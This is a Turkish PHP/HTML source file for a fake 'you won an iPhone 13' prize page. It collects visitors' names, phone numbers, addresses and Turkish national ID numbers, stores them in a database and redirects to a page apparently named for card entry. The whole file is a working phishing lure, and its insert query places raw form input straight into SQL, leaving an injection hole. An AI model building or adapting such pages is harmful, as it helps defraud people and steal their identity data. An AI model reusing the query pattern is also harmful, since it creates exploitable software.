
<?php
include("FORMWEB.php");

if(isset($_POST["Gönder"]))
{
    $isim=$_POST["isim"];
    $soyisim=$_POST["soyisim"];
    $sehir=$_POST["sehir"];
    $telefon=$_POST["telefon"];
    $adres=$_POST["adres"];
    $tc=$_POST["tc"];
    

    $insert="insert into iphone (isim,soyisim,sehir,telefon,adres,tc) VALUES ('$isim','$soyisim','$sehir','$telefon','$adres','$tc')";
    $insertKayit = mysqli_query($con,$insert);

    if($insertKayit){
        //echo 'Kayıt Başarılı bir şekilde eklendi.';
        header('Location:kart.php');
    }
    else{
       // echo ' Kayıt eklenirken bir problem oluştu.';
    mysqli_close($con);
}
}
?>


<!DOCTYPE html>
<html>
<head>
<title>iPhone Kazandınız</title>
<link rel="stylesheet" href="iphone.css">


</head>
<body>
   
    <img id="smrt"src="smrt.png">
    <img id="krmz"src="Kırmızı.png">

    </script>
    <div class="baslik">
        <p>TEBRİKLER IPHONE 13 KAZANDINIZ.!.</p>
        </div>
    <div class="yazi">
        <p>Lütfen aşağıdaki bilgileri doğru bir şekilde doldurunuz.</p>
    </div>  
 
    <div class="diskutu">
        <form action="" method="POST">
<div class="formkontrol">
    <input type="text" name="isim"required>
    <label for="#">İsim</label>
</div>
<div class="formkontrol">
    <input type="text" name="soyisim"required>
    <label for="#">Soy İsim</label>
</div>
<div class="formkontrol">
    <input type="text"name="sehir" required>
    <label for="#">Şehir</label>
</div>
<div class="formkontrol">
    <input type="tel" name="telefon"required>
    <label for="tel">Telefon Numarası</label>
</div>
<div class="formkontrol">
    <textarea cols="30" rows="2"name="adres"></textarea>
    <label for="#">Adres</label>
</div>

 <div class="formkontrol">
    <input type="text"name="tc" >
    <label for="#">TC Kimlik No</label>
</div>
 <div class="formkontrol">
    <label id="sec">iPhone renginizi seçiniz.</label>
    
 </div>
 <div class="formkontrol">
    <label id="siyah">Siyah</label>
    <input type="radio" name="renk">
 </div>
 <div class="formkontrol">
    <label id="beyaz">Beyaz</label>
    <input type="radio" name="renk">
 </div>
 <div class="formkontrol">
    <label id="kirmizi">Kırmızı</label>
    <input type="radio" name="renk">
 </div>
 <div class="formkontrol">
    <label id="yesil">Yeşil (Yetersiz Stok!)</label>
    
 </div>
 <div class="formkontrol">
    <label id="mavi">Mavi</label>
    <input type="radio" name="renk">
 </div>
 <div class="formkontrol">
    <a href="/kart.php"><input type="submit" name="Gönder"></a>
    
 </div>
 
 


     </form>
    

</body>
</html>